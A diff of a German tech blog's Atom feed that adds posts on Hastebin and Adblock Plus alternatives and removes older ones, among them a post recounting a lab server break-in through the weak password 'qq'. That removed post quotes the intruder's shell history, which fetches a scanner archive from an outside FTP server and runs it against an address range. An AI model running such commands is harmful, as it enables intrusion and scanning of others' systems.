@@ -9,8 +9,83 @@
     <id>tag:blog.posativ.org,2011-06-11:/atom/</id>
     <link rel="alternate" type="text/html" href="http://blog.posativ.org/" />
     <link rel="self" type="application/atom+xml" href="http://blog.posativ.org/atom/" />
-    <updated>2013-06-07T16:25:00Z</updated>
+    <updated>2013-08-28T15:46:00Z</updated>
     <generator uri="https://github.com/posativ/acrylamid/" version="0.8.dev0">acrylamid</generator>
+        <entry>
+        <title>hastebin – Pastebin Server und Client</title>
+        <link rel="alternate" type="text/html" href="http://blog.posativ.org/2013/hastebin-pastebin-server-und-client/" />
+        <id>tag:blog.posativ.org,2013-08-28:/2013/hastebin-pastebin-server-und-client</id>
+        <updated>2013-08-28T15:46:00Z</updated>
+        <category term="Planet" />
+        <category term="Node.js" />
+        
+        <author>
+            <name>Martin Zimmermann</name>
+            <uri>http://blog.posativ.org/</uri>
+            <email>info@posativ.org</email>
+        </author>
+        <content type="html">&lt;p&gt;Ein eigener Pastebin, warum nicht. Ich hatte meinen &lt;a href=&#34;https://github.com/posativ/paste.posativ.org&#34;&gt;selbst geschrieben&lt;/a&gt;,
+allerdings nicht wirklich &lt;span class=&#34;caps&#34;&gt;&lt;abbr title=&#34;Keep it simple, stupid&#34;&gt;KISS&lt;/abbr&gt;&lt;/span&gt; zu deployen und ein Client-Skript erst recht
+nicht. Jetzt nutze ich &lt;a href=&#34;https://github.com/seejohnrun/haste-server&#34;&gt;Hastebin&lt;/a&gt;, ein Pastebin geschrieben in Node.js und
+einem Ruby (sic) Tool als&amp;nbsp;&lt;span class=&#34;caps&#34;&gt;&lt;abbr title=&#34;Command Line Interface&#34;&gt;CLI&lt;/abbr&gt;&lt;/span&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;Hastebin Screenshot&#34; class=&#34;center&#34; src=&#34;http://blog.posativ.org/img/2013/hastebin.png&#34;/&gt;&lt;/p&gt;
+&lt;p&gt;Die Installation ist recht simpel und viel tut die Anwendung auch nicht: Text
+in einer Redis-Instanz speichern (in Datei oder memcached auch möglich) und
+mit etwas &lt;a href=&#34;http://softwaremaniacs.org/soft/highlight/en/&#34;&gt;Highlight.js&lt;/a&gt; bunt machen.  Als &lt;span class=&#34;caps&#34;&gt;&lt;abbr title=&#34;Command Line Interface&#34;&gt;CLI&lt;/abbr&gt;&lt;/span&gt; noch &lt;code&gt;gem install haste&lt;/code&gt;
+installieren, &lt;code&gt;HASTE_SERVER=http://example.org&lt;/code&gt; setzen und mit &lt;code&gt;cat datei.py |
+haste&lt;/code&gt; (useless use of cat)&amp;nbsp;pastieren.&lt;/p&gt;</content>
+    </entry>
+    
+        <entry>
+        <title>Alternativen zu Adblock Plus</title>
+        <link rel="alternate" type="text/html" href="http://blog.posativ.org/2013/alternativen-zu-adblock-plus/" />
+        <id>tag:blog.posativ.org,2013-06-26:/2013/alternativen-zu-adblock-plus</id>
+        <updated>2013-06-26T21:25:00Z</updated>
+        <category term="Firefox" />
+        <category term="planet" />
+        
+        <author>
+            <name>Martin Zimmermann</name>
+            <uri>http://blog.posativ.org/</uri>
+            <email>info@posativ.org</email>
+        </author>
+        <content type="html">&lt;p&gt;Überrascht hat es mich schon: &lt;a href=&#34;http://www.mobilegeeks.de/adblock-plus-undercover-einblicke-in-ein-mafioeses-werbenetzwerk/&#34;&gt;&amp;#8220;Adblock Plus Undercover – Einblicke in ein
+mafiöses Werbenetzwerk&amp;#8221;&lt;/a&gt;. Betroffen hat es mich glücklicherweise nicht, denn
+in meiner allgemeinen Paranoia bin ich schon vor einem Jahr auf &lt;a href=&#34;https://www.requestpolicy.com/&#34;&gt;Request
+Policy&lt;/a&gt; umgestiegen, denn mir graut es nicht nur vor Werbung, sondern auch
+vor diverse Tracking Sites und Google APIs (Aluhut *duck*). &lt;!-- break --&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;Aktiver Werbe-Blocker! Nicht!&#34; src=&#34;http://blog.posativ.org/img/2013/werbe-blocker.png&#34; class=&#34;.shadow center&#34;/&gt;&lt;/p&gt;
+&lt;p&gt;Hahaha. Das ich nicht lache. Respektiere die Privatsphäre deiner Leser und
+ich würde deine Werbung sehen (wenn es nicht gerade Flash&amp;nbsp;wäre).&lt;/p&gt;
+&lt;h3&gt;Alternativen zu Adblock&amp;nbsp;Plus&lt;/h3&gt;
+&lt;p&gt;Meinen Familienmitgliedern kann ich &lt;a href=&#34;https://www.requestpolicy.com/&#34;&gt;Request Policy&lt;/a&gt; leider nicht zumuten,
+ist doch dann schon irgendwie sehr Aluhut-lastig. Adblock Plus&amp;#8217; Whitelist
+deaktivieren wäre ein Anfang, aber mein Vertrauen (sofern es je existierte),
+haben sie verloren. Was sind die&amp;nbsp;Alternativen?&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;/etc/hosts&lt;/code&gt; (sic!) mit &lt;a href=&#34;http://someonewhocares.org/hosts/&#34;&gt;someonewhocares.org/hosts&lt;/a&gt; befüllen; sind nur
+  10.000 Hosts. Allerdings ist der Blacklist-Ansatz &lt;a href=&#34;https://plus.google.com/112574395202528300835/posts/TcnA6cReija&#34;&gt;einfach falsch&lt;/a&gt; &amp;#8211; vor
+  allem auf Basis von&amp;nbsp;Hostnamen.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;polipo&lt;/code&gt; samt &lt;code&gt;adzapper&lt;/code&gt; hatte ich &lt;a href=&#34;http://blog.posativ.org/2012/polipo-a-caching-web-proxy/&#34;&gt;früher mal evaluiert&lt;/a&gt;, leider nur doof,
+  wenn die Regeln von der EasyList&amp;nbsp;kommen.&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;Wenn ihr nicht euer eigenes Geld druckt, seid ihr nur Produkt!&lt;/em&gt; sagte
+  einst Felix von Leitner &lt;sup id=&#34;fnref:1&#34;&gt;&lt;a class=&#34;footnote-ref&#34; href=&#34;http://blog.posativ.org/2013/alternativen-zu-adblock-plus/#fn:1&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;. Eine eigene Filterliste ist durchaus eine
+  zu erwägende Option (meint &lt;a href=&#34;http://mycrobase.de/&#34;&gt;@cmur2&lt;/a&gt;).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Schön ist das alles nicht. Wenn&amp;#8217;s nicht gerade &lt;a href=&#34;https://www.requestpolicy.com/&#34;&gt;Request Policy&lt;/a&gt; sein muss,
+erscheinen mir eigene Filterlisten das geringste Übel und wären damit sogar in
+Chrome nutzbar (nicht, dass dessen Nutzer diese Aluhutprobleme&amp;nbsp;hätten).&lt;/p&gt;
+&lt;p&gt;Was kennt und/oder nutzt&amp;nbsp;ihr?&lt;/p&gt;
+&lt;div class=&#34;footnote&#34;&gt;
+&lt;hr /&gt;
+&lt;ol&gt;
+&lt;li id=&#34;fn:1&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://twitter.com/FelixvonLeitner/status/346359431983931393&#34;&gt;https://twitter.com/FelixvonLeitner/status/346359431983931393&lt;/a&gt;&amp;#160;&lt;a class=&#34;footnote-backref&#34; href=&#34;http://blog.posativ.org/2013/alternativen-zu-adblock-plus/#fnref:1&#34; title=&#34;Jump back to footnote 1 in the text&#34;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/div&gt;</content>
+    </entry>
+    
         <entry>
         <title>sslh - ssl/ssh multiplexer</title>
         <link rel="alternate" type="text/html" href="http://blog.posativ.org/2013/sslh-ssl-ssh-multiplexer/" />
@@ -1335,95 +1410,5 @@ zum ermäßigten Tarif&amp;nbsp;rein.&lt;/p&gt;
 
 &lt;p&gt;Nach drei Tagen ging es mit der Eisenbahn über zwei Tage Richtung
 Yekaterinburg&amp;#8230; &lt;em&gt;to be continued&lt;/em&gt;.&lt;/p&gt;</content>
-    </entry>
-    
-        <entry>
-        <title>Hack&#39;d</title>
-        <link rel="alternate" type="text/html" href="http://blog.posativ.org/2012/qq-und-die-it-sicherheit/" />
-        <id>tag:blog.posativ.org,2012-05-18:/2012/qq-und-die-it-sicherheit</id>
-        <updated>2012-05-18T18:37:00Z</updated>
-        <category term="Linux" />
-        
-        <author>
-            <name>Martin Zimmermann</name>
-            <uri>http://blog.posativ.org/</uri>
-            <email>info@posativ.org</email>
-        </author>
-        <content type="html">&lt;p&gt;Letzten Mittwoch bekam ich während einer Vorlesung &amp;#8216;ne Mail, dass das
-Rechenzentrum der Universität einen Hack0r-Angriff an einem unserer
-Rechensklaven festgestellt hat. Etwas schockiert, wie &lt;span class=&#34;caps&#34;&gt;DAS&lt;/span&gt; nur mit &lt;span class=&#34;caps&#34;&gt;LINUX&lt;/span&gt;
-passieren konnte, bin ich schnell vorbeigekommen und fand in der Tat eine Art&amp;nbsp;&amp;#8220;Bot&amp;#8221;.&lt;/p&gt;
-&lt;p&gt;Als ordentlicher Sys-Admin nutzen ich und meine Kollegin nur &lt;span class=&#34;caps&#34;&gt;&lt;abbr title=&#34;Secure Shell&#34;&gt;SSH&lt;/abbr&gt;&lt;/span&gt;-Keys und so
-dachte ich mir auch nichts, als ich bei der versehentlichen Deskop-Variante
-von Ubuntu dem Standard-Nutzer das Passwort &lt;code&gt;qq&lt;/code&gt; zu geben, immerhin würde ich
-ja den &lt;span class=&#34;caps&#34;&gt;&lt;abbr title=&#34;Secure Shell&#34;&gt;SSH&lt;/abbr&gt;&lt;/span&gt;-Zugang auf Schlüsseldateien beschränken. Naja, dazu kam es dann
-doch nicht, weil sich die Biologen im Praktikum schon so schwer genug mit
-einer &lt;span class=&#34;caps&#34;&gt;UNIX&lt;/span&gt;-Shell tun und so konnte man sich weiterhin per Passwort&amp;nbsp;einloggen.&lt;/p&gt;
-&lt;p&gt;So hat sich dann nach mehreren Monaten &amp;#8211; 191 Tage um genau zu sein &amp;#8211; doch
-endlich jemand gefunden und den viel, viel schwereren Nutzernamen zu obigem
-Passwort zu finden! Nämlich &amp;#8220;dev&amp;#8221;. Das ist &lt;em&gt;Security by Obscurity&lt;/em&gt; vom
-feinsten! Der Bot war aber auch nicht der klügste. Seine Aktivitäten waren
-(primär Portscanning) komplett in der &lt;em&gt;.bash_history&lt;/em&gt;&amp;nbsp;nachzulesen:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;span class=&#34;nv&#34;&gt;$ &lt;/span&gt;wget ftp://test:testtest@62.160.84.235/KapelaScan.tgz; tar zxvf K*
-&lt;span class=&#34;nv&#34;&gt;$ &lt;/span&gt;rm -rf KapelaScan.tgz; &lt;span class=&#34;nb&#34;&gt;cd &lt;/span&gt;kapela
-&lt;span class=&#34;nv&#34;&gt;$ &lt;/span&gt;chmod +x *
-&lt;span class=&#34;nv&#34;&gt;$ &lt;/span&gt;ls
-&lt;span class=&#34;nv&#34;&gt;$ &lt;/span&gt;./a 80.236
-&lt;span class=&#34;nv&#34;&gt;$ &lt;/span&gt;ps x
-&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;Ein &lt;code&gt;rm -rf /home/dev&lt;/code&gt; setzte dem Spuk dann ein Ende. Wer an einem
-&lt;a href=&#34;http://blog.posativ.org/files/2012/kapela.zip&#34;&gt;Dump&lt;/a&gt; interessiert ist. Inklusive Passwortliste, wo
-auch &lt;code&gt;qq&lt;/code&gt; gelistet war. Es ist also &lt;em&gt;wirklich&lt;/em&gt; ein unsicheres Passwort&amp;nbsp;:-)&lt;/p&gt;</content>
-    </entry>
-    
-        <entry>
-        <title>Linkschleuder #23</title>
-        <link rel="alternate" type="text/html" href="http://blog.posativ.org/2012/linkschleuder-23/" />
-        <id>tag:blog.posativ.org,2012-05-02:/2012/linkschleuder-23</id>
-        <updated>2012-05-02T16:59:00Z</updated>
-        <category term="GitHub" />
-        <category term="OS X" />
-        <category term="Links" />
-        <category term="mercurial" />
-        
-        <author>
-            <name>Martin Zimmermann</name>
-            <uri>http://blog.posativ.org/</uri>
-            <email>info@posativ.org</email>
-        </author>
-        <content type="html">&lt;p&gt;Wieder mal eine etwas umfangreicherer Auswurf zu allerlei nutzlosen bis nützlichen&amp;nbsp;Projekten.&lt;/p&gt;
-&lt;h3&gt;Misc&lt;/h3&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&#34;https://github.com/myusuf3/octogit&#34;&gt;octogit&lt;/a&gt; – ein kleines Tool (mit &lt;a href=&#34;https://github.com/myusuf3/octogit/pull/14&#34;&gt;gigantischen Dependencies&lt;/a&gt;) für Github&amp;#8217;s Issues, das das Projekt automatisch aus dem unterliegenden Git-Repository entnimmt (und bei non-&lt;span class=&#34;caps&#34;&gt;&lt;abbr title=&#34;American Standard Code for Information Interchange&#34;&gt;ASCII&lt;/abbr&gt;&lt;/span&gt; failt&amp;nbsp;m).&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://dotfiles.github.com/&#34;&gt;Github ❤ ~/&lt;/a&gt; – &lt;em&gt;Your unofficial guide to dotfiles on&amp;nbsp;GitHub.&lt;/em&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://nitrotasks.com/&#34;&gt;Nitro&lt;/a&gt; – ein freies Programm für das&amp;nbsp;&lt;span class=&#34;caps&#34;&gt;TODO&lt;/span&gt;-Management.&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://www.funtoo.org/wiki/Welcome&#34;&gt;Funtoo&lt;/a&gt; – wie der Name erwarten lässt, eine Art &lt;a href=&#34;http://www.gentoo.org/&#34;&gt;Gentoo&lt;/a&gt; nur git-based, verteilter Portage Tree und vieles&amp;nbsp;mehr.&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://github.com/sferik/t&#34;&gt;t&lt;/a&gt; – &lt;em&gt;t&lt;/em&gt; ist Twitter für die &lt;span class=&#34;caps&#34;&gt;&lt;abbr title=&#34;Command Line Interface&#34;&gt;CLI&lt;/abbr&gt;&lt;/span&gt;, die sich gut in die &lt;span class=&#34;caps&#34;&gt;UNIX&lt;/span&gt;-Toolchain&amp;nbsp;integriert.&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://trilandev.com/snippets/&#34;&gt;Snippets&lt;/a&gt; – ist eine Art static compiler (angelehnt an &lt;a href=&#34;http://pelican.notmyidea.org/&#34;&gt;Pelican&lt;/a&gt;) für Code-Schnipsel, schon ganz&amp;nbsp;hübsch.&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://casperjs.org/&#34;&gt;CasperJS&lt;/a&gt; – ist ein Webkit/&lt;span class=&#34;caps&#34;&gt;JS&lt;/span&gt;-Framework um Browser-Interaktionen automatisiert zu&amp;nbsp;testen.&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://codebomber.com/jquery/resizer/&#34;&gt;Resizer&lt;/a&gt; – &lt;em&gt;A responsive design bookmarklet&lt;/em&gt; (gefunden von &lt;a href=&#34;http://sebix.github.com/&#34;&gt;sebix&lt;/a&gt;), alternativ gibt&amp;#8217;s auch &lt;a href=&#34;http://www.benjaminkeen.com/misc/bricss/&#34;&gt;diesen Generator&lt;/a&gt;.&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://github.com/plaetzchen/Rezepte&#34;&gt;Rezepte&lt;/a&gt; – verschiedene Kochrezepte, die mit social coding auf GitHub entstanden sind&amp;nbsp;:-)&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://www.radiotux.de/index.php?/categories/16-Binaergewitter&#34;&gt;Binärgewitter&lt;/a&gt; – ein Geek-Podcast und darum&amp;nbsp;hörenswert!&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://matt.might.net/articles/programmers-resolutions/&#34;&gt;12 resulutions for&amp;nbsp;programmers&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3&gt;&lt;span class=&#34;caps&#34;&gt;OS&lt;/span&gt;&amp;nbsp;X&lt;/h3&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&#34;http://markedapp.com/&#34;&gt;Marked&lt;/a&gt; – eine kostenpflichtige App für &lt;span class=&#34;caps&#34;&gt;OS&lt;/span&gt; X, die einfach per &lt;a href=&#34;https://en.wikipedia.org/wiki/FSEvents&#34;&gt;FSEvent&lt;/a&gt; Markdown in besonders hübsch rendert. Mit eigenen Skripts kann man damit auch reStructuredText&amp;nbsp;rendern.&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://www.omh.cc/Clyppan-Clipboard-Manager-for-the-Mac/&#34;&gt;Clyppan&lt;/a&gt; – die Linuxer werden sich jetzt totlachen, aber um an alte Zwischenablagen zu kommen, müssen Mac-User schon 5 €&amp;nbsp;investieren.&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://www.klieme.com/TimeMachineScheduler.html&#34;&gt;TimeMachineScheduler&lt;/a&gt; – ist eine kostenlose Preference Pane, die z.B. das Backup-Intervall steuern kann (ist bug-lastig, wenn das Backup nicht immer angeschlossen ist!). Andernfalls hilft auch ein beherztes &lt;code&gt;sudo defaults write /System/Library/LaunchDaemons/com.apple.backupd-auto StartInterval -int 14400&lt;/code&gt; um das Backup alle drei Stunden&amp;nbsp;auszuführen.&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://superuser.com/questions/251969/disable-or-sleep-secondary-hard-drive-in-macbook&#34;&gt;Disable or sleep secondary hard drive in Macbook&lt;/a&gt; – denn nach einem &lt;span class=&#34;caps&#34;&gt;SSD&lt;/span&gt;-Upgrade ist es schon recht nervig, dass die zweite &lt;span class=&#34;caps&#34;&gt;HDD&lt;/span&gt; endlos&amp;nbsp;weiterläuft.&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3&gt;Python&lt;/h3&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&#34;http://mg.pov.lt/restview/&#34;&gt;restview&lt;/a&gt; – ein sehr praktischer reStructuredText Viewer, leider ohne &lt;a href=&#34;http://sphinx.pocoo.org/&#34;&gt;Sphinx&lt;/a&gt;-Support.&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://pypi.python.org/pypi/cram&#34;&gt;cram&lt;/a&gt; – &lt;span class=&#34;caps&#34;&gt;BBD&lt;/span&gt; aka Behavior Driven development für &lt;span class=&#34;caps&#34;&gt;&lt;abbr title=&#34;Command Line Interface&#34;&gt;CLI&lt;/abbr&gt;&lt;/span&gt;-Tools und wird unter anderem auch von &lt;a href=&#34;http://mercurial.selenic.com/&#34;&gt;mercurial&lt;/a&gt;&amp;nbsp;genutzt.&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://home.wlu.edu/~lambertk/pythontojava/&#34;&gt;Python to Java&lt;/a&gt; – weil es das Studium wieder verlangt: wieviel Boilerplate brauche ich, um ein Konstrukt von Python in Java zu schreiben. Eine sehr hilfreiche&amp;nbsp;Referenz!&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://github.com/jabapyth/codetalker&#34;&gt;Codetalker&lt;/a&gt; – &lt;em&gt;A succinct, pythonic parser + translator&amp;nbsp;solution&lt;/em&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://github.com/toastdriven/microsearch/blob/master/microsearch.py&#34;&gt;microsearch&lt;/a&gt; – eine wunderbar dokumentierte Lösung für eine performante Search-Engine in&amp;nbsp;Python.&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://www.tarind.com/depgraph.html&#34;&gt;depgraph&lt;/a&gt; – &lt;em&gt;Generating Python Module Dependency&amp;nbsp;Graphs&lt;/em&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://projects.unbit.it/uwsgi/wiki&#34;&gt;uWSGI&lt;/a&gt; – ein micro-&lt;a href=&#34;https://en.wikipedia.org/wiki/Web_Server_Gateway_Interface&#34;&gt;&lt;span class=&#34;caps&#34;&gt;&lt;abbr title=&#34;Web Server Gateway Interface&#34;&gt;WSGI&lt;/abbr&gt;&lt;/span&gt;&lt;/a&gt; Server, der einen mit seinen &lt;span class=&#34;caps&#34;&gt;&lt;abbr title=&#34;Command Line Interface&#34;&gt;CLI&lt;/abbr&gt;&lt;/span&gt;-Optionen regelrecht erschlägt: &lt;code&gt;wsgi --help | wc -l&lt;/code&gt; ergeben 379 Zeilen. Selbst ausgereifte Tools wie &lt;code&gt;wget&lt;/code&gt; oder &lt;code&gt;curl&lt;/code&gt; haben nur knapp die&amp;nbsp;Hälfte.&lt;/li&gt;
-&lt;/ul&gt;</content>
     </entry>
     </feed>
